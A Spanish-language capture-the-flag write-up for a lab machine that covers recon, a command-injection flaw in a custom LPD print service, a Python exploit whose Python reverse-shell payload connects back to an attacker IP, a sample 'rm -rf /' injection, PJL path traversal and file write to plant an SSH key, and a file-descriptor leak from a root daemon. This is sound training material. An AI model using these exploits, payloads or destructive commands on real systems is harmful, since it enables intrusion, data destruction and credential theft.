@@ -1,0 +1,626 @@
+---
+layout: apunte
+title: "1. Getting the Flags"
+---
+
+<h2>Reconocimiento Inicial</h2>
+Comenzamos analizando los puertos abiertos.
+
+!**Pasted image 20260718173545.png**
+
+Ahora vamos a analizar más profundamente dichos puertos a ver qué encontramos.
+
+!**Pasted image 20260718173627.png**
+
+Vamos a ver directorios de la web.
+
+!**Pasted image 20260718174509.png**
+
+Parece que no vemos nada por aquí.
+
+--------------------------------
+<h2>Profundización</h2>
+Vamos a mirar cómo es la web.
+
+!**Pasted image 20260718174602.png**
+
+Parece que aquí hay información relevante. Vamos a descargarnos el archivo de procesador interno. Lo descomprimimos y lo analizamos.
+
+!**Pasted image 20260718175537.png**
+
+```python
+import socket
+import threading
+import subprocess
+import subprocess
+
+VALID_QUEUE = os.environ.get("LPD_QUEUE")
+
+class LpdHandler(threading.Thread):
+
+    def __init__(self, sock, addr):
+        super().__init__()
+        self.sock = sock
+        self.addr = addr
+        self.id = f"[lpd-{addr[1]}]"
+
+    def run(self):
+        try:
+            data = self.sock.recv(1024)
+            if not data: return
+            
+            command = data[0]
+            
+            if command == 2:
+                self.handle_print_job(data)
+            elif command in (3, 4):
+                self.sock.send(b"Archive_Printer is ready and printing.\n")
+                
+        except Exception as e:
+            print(f"{self.id} Error: {e}")
+        finally:
+            self.sock.close()
+
+    def handle_print_job(self, data):
+        queue = data[1:].decode().strip()
+        
+        if queue not in VALID_QUEUE:
+            print(f"{self.id} Rejected: Invalid queue '{queue}'")
+            self.sock.send(b'\x01') 
+            return
+        print(f"{self.id} Accepted job for queue: {queue}")
+        while True:
+            chunk = self.sock.recv(1024)
+            if not chunk: break
+            
+            subcommand = chunk[0]
+            self.sock.send(b'\x00') 
+                parts = chunk[1:].decode(errors='ignore').split()
+                if not parts: continue
+                
+                size = int(parts[0])
+                content = b""
+                while len(content) < size:
+                    content += self.sock.recv(size - len(content) + 1)
+                
+                decoded_content = content.decode(errors='ignore')
+                
+                job_name = "Unknown"
+                for line in decoded_content.split('\n'):
+                    line = line.strip()
+                    if line.startswith('J'):
+                        job_name = line[1:]
+                        break
+                
+                print(f"{self.id} Executing archive for: {job_name}")
+                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+                
+                self.sock.send(b'\x00') 
+                self.sock.send(b'\x00')
+                while self.sock.recv(4096):
+                    pass
+                break
+
+class LpdServer:
+
+    def __init__(self, ip='0.0.0.0', port=1515):
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind((ip, port))
+        self.server.listen(100)
+        print(f"[*] LPD Server listening on {port}")
+
+    def run(self):
+        while True:
+            sock, addr = self.server.accept()
+            LpdHandler(sock, addr).start()
+
+if __name__ == "__main__":
+    LpdServer(port=1515).run()
+```
+
+Al analizarlo detenidamente nos damos cuenta que existe una vulnerabilidad de inyección en la parte de ejecución de trabajos:
+
+```python
+job_name = "Unknown"
+for line in decoded_content.split('\n'):
+	line = line.strip()
+	if line.startswith('J'):
+		job_name = line[1:]
+		break
+                
+print(f"{self.id} Executing archive for: {job_name}")
+subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
+```
+
+Se está cogiendo el input del usuario sin sanitizar. Además, debido al parámetro `shell=True`, el comando no se ejecuta directamente, sino que se escribe en una shell, como si alguien lo hubiera introducido. Es por esto, que donde normalmente se escribiría:
+
+```bash
+'Archive: {job_name}' >> /tmp/archive.log
+```
+
+Se escriba (en caso de que el usuario pase como trabajo por ejemplo `Job'; rm -rf / #`), lo que quedará escrito de la siguiente manera:
+
+```bash
+'Archive: Job'; rm -rf / # >> /tmp/archive.log
+```
+
+---------------------------------------
+<h2>Explotación</h2>
+Sabiendo esto, podemos desarrollar un exploit en Python que nos devuelva una shell:
+
+```python
+import socket
+import time
+
+attacker_ip = "[REDACTED]"
+attacker_port = 4444
+target_ip = "[MACHINE_IP]"
+target_port = 1515
+
+# Aquí colocamos el nombre de la cola que encontramos en el puerto 80
+QUEUE_NAME = "archive_intake" 
+
+# Usamos una shell interactiva de Python como payload
+python_payload = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
+
+# Formateamos el payload para que la linea se separe de forma limpia en el "\n" y comience con "J"
+payload_line = f"Jtest'; {python_payload} #\n"
+payload_bytes = payload_line.encode()
+size = len(payload_bytes)
+
+print(f"[*] Connecting to {target_ip}:{target_port}...")
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target_ip, target_port))
+
+# Paso 1: Mandar el comando de cola (\x02 + target queue)
+print(f"[*] Sending queue name: '{QUEUE_NAME}'...")
+s.send(b"\x02" + QUEUE_NAME.encode() + b"\n")
+
+# Paso 2: Leemnos ACK para verificar la transición
+ack1 = s.recv(1)
+print(f"[*] Server response for queue selection: {ack1}")
+
+if ack1 == b'\x01':
+    print("[-] Error: Queue name rejected by server.")
+    s.close()
+    exit()
+elif ack1 == b'\x00':
+    print("[+] Queue name accepted. Moving to file transmission configuration...")
+    time.sleep(0.5)  # Pequeña pausa para evitar mezclado de paquetes en el buffer del servidor
+
+    # Paso 3: Declaramos la estructura del payload del subcomando
+    # Mandamos el código estándar de subcomando \x02 para instruir aceptación de información
+    subcommand_header = b"\x02" + f"{size} dfA000localhost\n".encode()
+    s.send(subcommand_header)
+    
+    ack2 = s.recv(1)
+    print(f"[*] Server response for file header allocation: {ack2}")
+    time.sleep(0.5)
+    
+    # Paso 4: Transmitir el contenido real del payload con el hook de ejecución
+    print("[*] Dispatching payload buffer string...")
+    s.send(payload_bytes + b"\x00")
+    
+    print("[*] Data transmission finished. Check your terminal listener.")
+
+s.close()
+```
+
+Si ejecutamos esto después de ponernos en escucha:
+
+!**Pasted image 20260718182230.png**
+!**Pasted image 20260718182242.png**
+
+Estabilizamos la consola:
+
+!**Pasted image 20260718182326.png**
+
+Una vez hecho esto procedemos a enumerar el sistema. Primero qué somos:
+
+!**Pasted image 20260718182853.png**
+
+No es la cuenta de un humano. Y ahora vamos a enumerar usuarios (humanos):
+
+!**Pasted image 20260718183424.png**
+
+Ahora vamos a enumerar procesos. Nos interesan sobre todo procesos de este usuario (o de root, en su defecto):
+
+!**Pasted image 20260718183600.png**
+
+Nos interesan estos tres, pero sobre todo el del usuario `archivist`. Vamos a comprobar el puerto.
+
+!**Pasted image 20260718184013.png**
+
+Al estar ligado a `127.0.0.1`, sólo se puede atacar desde dentro. 
+
+!**Pasted image 20260718184130.png**
+
+Parece que se trata de una impresora. Vamos a comprobar si acepta comandos PJL:
+
+!**Pasted image 20260718184429.png**
+
+La herramienta `nc` no está instalado, por lo que tendremos que usar Python, por ejemplo:
+
+!**Pasted image 20260718184545.png**
+
+Pues sí que acepta. Vamos a crear un cliente reutilizable con:
+
+```bash
+cat > /tmp/pjl.py <<'PY'
+#!/usr/bin/env python3
+import socket
+import sys
+
+if len(sys.argv) != 2:
+    print(f"Uso: {sys.argv[0]} '@PJL INFO ID'")
+    raise SystemExit(1)
+
+command = sys.argv[1].encode() + b"\r\n"
+
+with socket.create_connection(("127.0.0.1", 9100), timeout=3) as sock:
+    sock.settimeout(2)
+    sock.sendall(command)
+
+    response = bytearray()
+
+    while True:
+        try:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            response.extend(chunk)
+        except socket.timeout:
+            break
+
+print("RAW:", repr(bytes(response)))
+print(response.decode(errors="replace"))
+PY
+
+chmod +x /tmp/pjl.py
+```
+
+Una vez hecho esto, podemos mandar comandos de una forma más sencilla:
+
+!**Pasted image 20260718184801.png**
+
+Si pedimos el "directorio" `0:\`, nos devuelve lo siguiente:
+
+!**Pasted image 20260718185441.png**
+
+Vamos a ver si podemos subir un nivel:
+
+!**Pasted image 20260718185518.png**
+
+Pues efectivamente parece que existe el PATH TRAVERSAL. Vamos a leer al flag del `user.txt`.
+
+!**Pasted image 20260718185641.png**
+
+Para ello usamos el comando `FSUPLOAD` en lugar de `FSDIRLIST`.
+
+Leemos ahora el archivo `jetdirect.py`.
+
+```python
+#!/usr/bin/env python3
+
+import os
+import sys
+import socket
+import logging
+import re
+import hashlib
+
+class PJLServer:
+    def __init__(self):
+        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+    def listen(self, port=9100, backlog=100):
+        self._server.bind(("127.0.0.1", port))
+        self._server.listen(backlog)
+        logging.info("Listening on port %d" % port)
+
+    def accept(self):
+        client, addr = self._server.accept()
+        logging.info("[%s] connected" % addr[0])
+        return PJLClient(client, addr[0])
+
+class PJLClient:
+    def __init__(self, client, address):
+        self._client = client
+        self._address = address
+
+    def get_line(self):
+        """Reads until a newline to get a single PJL command."""
+        line = b""
+        while True:
+            char = self._client.recv(1)
+            if not char: return None
+            line += char
+            if char == b"\n": break
+        return line
+
+    def reply(self, message):
+        if isinstance(message, str):
+            message = message.encode("utf-8")
+        self._client.sendall(message)
+
+    def close(self):
+        self._client.close()
+
+class Filesystem:
+    def __init__(self, root_dir):
+        self._root = os.path.abspath(root_dir)
+
+    def _translate(self, path):
+        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+        return os.path.normpath(os.path.join(self._root, clean))
+
+    def listdir(self, name=""):
+        target = self._translate(name)
+        if not os.path.exists(target): return "FILEERROR=1"
+        try:
+            items = os.listdir(target)
+            res = [". TYPE=DIR", ".. TYPE=DIR"]
+            for i in items:
+                p = os.path.join(target, i)
+                res.append(f"{i} TYPE={'DIR' if os.path.isdir(p) else 'FILE'} SIZE={os.path.getsize(p)}")
+            return "\n".join(res)
+        except: return "FILEERROR=1"
+
+    def read(self, path):
+        target = self._translate(path)
+        if os.path.isfile(target):
+            with open(target, "rb") as f: return f.read()
+        return None
+
+    def write(self, path, data):
+        target = self._translate(path)
+        try:
+            os.makedirs(os.path.dirname(target), exist_ok=True)
+            with open(target, "wb") as f: f.write(data)
+            return "OK"
+        except: return "FILEERROR=1"
+
+fs = None
+
+def handle_download(command, client):
+    m = re.search(r'NAME\s*=\s*"([^"]+)"\s*SIZE\s*=\s*(\d+)', command, re.I)
+    if not m: return "FILEERROR=1"
+    path, size = m.group(1), int(m.group(2))
+    
+    logging.info(f"Receiving file: {path} ({size} bytes)")
+    data = b""
+    while len(data) < size:
+        chunk = client._client.recv(min(size - len(data), 4096))
+        if not chunk: break
+        data += chunk
+    return fs.write(path, data)
+
+def handle_upload(command):
+    m = re.search(r'NAME\s*=\s*"([^"]+)"', command, re.I)
+    if not m: return "FILEERROR=1"
+    path = m.group(1)
+    data = fs.read(path)
+    if data is None: return "FILEERROR=1"
+    header = f'@PJL FSUPLOAD NAME="{path}" SIZE={len(data)}\n'.encode("utf-8")
+    return header + data
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print(f"Usage: {sys.argv[0]} <PORT> <ROOT_DIR>")
+        sys.exit(1)
+
+    fs = Filesystem(sys.argv[2])
+    LOG_FILE = "/home/archivist/printer/logs/commands.log"
+    logging.basicConfig(
+        level=logging.INFO,
+        format="%(message)s",
+        handlers=[
+            logging.FileHandler(LOG_FILE),
+            logging.StreamHandler(sys.stdout)
+        ]
+    )
+    server = PJLServer()
+    server.listen(int(sys.argv[1]))
+
+    while True:
+        client = server.accept()
+        while True:
+            line_bytes = client.get_line()
+            if not line_bytes: break
+            
+            # Filter protocol noise
+            if b"@" not in line_bytes: continue
+            line = line_bytes[line_bytes.find(b"@"):].decode("utf-8", errors="ignore").strip()
+            
+            if not line.startswith("@PJL"): continue
+            logging.info(f"Command: {line}")
+
+            if "FSDOWNLOAD" in line.upper():
+                res = handle_download(line, client)
+                client.reply(res + "\r\n")
+            elif "FSUPLOAD" in line.upper():
+                res = handle_upload(line)
+                client.reply(res)
+            elif "FSDIRLIST" in line.upper() or "FSQUERY" in line.upper():
+                m = re.search(r'NAME\s*=\s*"([^"]+)"', line, re.I)
+                res = fs.listdir(m.group(1) if m else "0:/")
+                client.reply(res + "\r\n")
+            elif "INFO ID" in line.upper():
+                client.reply("HP LASERJET 4ML\r\n")
+            elif "INFO FILESYS" in line.upper():
+                client.reply("VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS\n0:     1755136    1718272    <HT>     <HT>  READ-WRITE\r\n")
+            elif "ECHO" in line.upper():
+                client.reply(line + "\r\n")
+            else:
+                client.reply("OK\r\n")
+        client.close()
+```
+
+Y allí encontramos que `FSDOWNLOAD` permite escribir archivos arbitrarios como `archivist`. Por lo que vamos a crear un par de claves en nuestra Kali con:
+
+```bash
+ssh-keygen -t ed25519 -f archivist_key -N ''
+```
+
+La servimos desde la Kali y la descargamos desde la shell:
+
+!**Pasted image 20260718190725.png**
+
+Creamos un cliente como antes pero ahora para `FSDOWNLOAD`:
+
+```bash
+cat > /tmp/pjl_write.py <<'PY'
+#!/usr/bin/env python3
+
+import socket
+import sys
+
+if len(sys.argv) != 3:
+    print(f"Uso: {sys.argv[0]} '<ruta_remota>' <archivo_local>")
+    raise SystemExit(1)
+
+remote_path = sys.argv[1]
+local_file = sys.argv[2]
+
+with open(local_file, "rb") as file:
+    data = file.read()
+
+command = (
+    f'@PJL FSDOWNLOAD NAME="{remote_path}" SIZE={len(data)}\r\n'
+).encode()
+
+print(f"[+] Ruta remota: {remote_path}")
+print(f"[+] Tamaño: {len(data)} bytes")
+print(f"[+] Comando: {command!r}")
+
+with socket.create_connection(("127.0.0.1", 9100), timeout=3) as sock:
+    sock.settimeout(3)
+
+    # get_line() consumirá el comando hasta \n.
+    # handle_download() leerá después exactamente len(data) bytes.
+    sock.sendall(command + data)
+    sock.shutdown(socket.SHUT_WR)
+
+    response = bytearray()
+
+    while True:
+        try:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            response.extend(chunk)
+        except socket.timeout:
+            break
+
+print("[+] Respuesta:", repr(bytes(response)))
+PY
+
+chmod +x /tmp/pjl_write.py
+```
+
+Lo ejecutamos para escribir la clave.
+
+!**Pasted image 20260718191706.png**
+
+Iniciamos sesión por SSH:
+
+!**Pasted image 20260718191814.png**
+
+--------------------------------------
+<h2>Escalada de Privilegios</h2>
+Si recordamos, había un daemon llamado `paperwork-daemon`. Vamos a ver si `archivist` puede hacer algo con él.
+
+!**Pasted image 20260718192159.png**
+
+Parece que sí. Además, en el log aparecen los comandos que hemos usado anteriormente.
+
+Creamos el siguiente cliente:
+
+```bash
+cat > /tmp/leak_fds.py <<'PY'
+#!/usr/bin/env python3
+
+import array
+import os
+import socket
+
+socket_path = "/run/paperwork/mgmt.sock"
+
+sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+sock.connect(socket_path)
+
+fd_size = array.array("i").itemsize
+
+message, ancillary, flags, address = sock.recvmsg(
+    4096,
+    socket.CMSG_SPACE(8 * fd_size)
+)
+
+print("[+] Mensaje:")
+print(message.decode(errors="replace"))
+
+received_fds = []
+
+for level, msg_type, data in ancillary:
+    if level == socket.SOL_SOCKET and msg_type == socket.SCM_RIGHTS:
+        usable = len(data) - (len(data) % fd_size)
+
+        fds = array.array("i")
+        fds.frombytes(data[:usable])
+
+        received_fds.extend(fds)
+
+print(f"[+] FDs recibidos: {received_fds}")
+
+for index, fd in enumerate(received_fds):
+    print(f"\n===== FD {index}: {fd} =====")
+
+    try:
+        os.lseek(fd, 0, os.SEEK_SET)
+
+        content = bytearray()
+
+        while True:
+            chunk = os.read(fd, 4096)
+            if not chunk:
+                break
+            content.extend(chunk)
+
+        print(content.decode(errors="replace"))
+
+    except OSError as error:
+        print(f"Error: {error}")
+
+    finally:
+        try:
+            os.close(fd)
+        except OSError:
+            pass
+
+sock.close()
+PY
+
+chmod +x /tmp/leak_fds.py
+python3 /tmp/leak_fds.py
+```
+
+Que al ser ejecutado nos devolverá la contraseña del administrador:
+
+!**Pasted image 20260718192419.png**
+
+Ponemos la contraseña y leemos la flag:
+
+!**Pasted image 20260718192459.png**
+
+----------------------------------------------------
+<h2>Conclusión</h2>
+Una máquina para nada fácil. En ella hemos aprendido principalmente:
+
+- Comandos PJL.
+- Funcionamiento de servicios y daemons.
+- Desarrollo de exploits con Python.
+
+>[!SUCCESS] Ambas flags obtenidas!
+
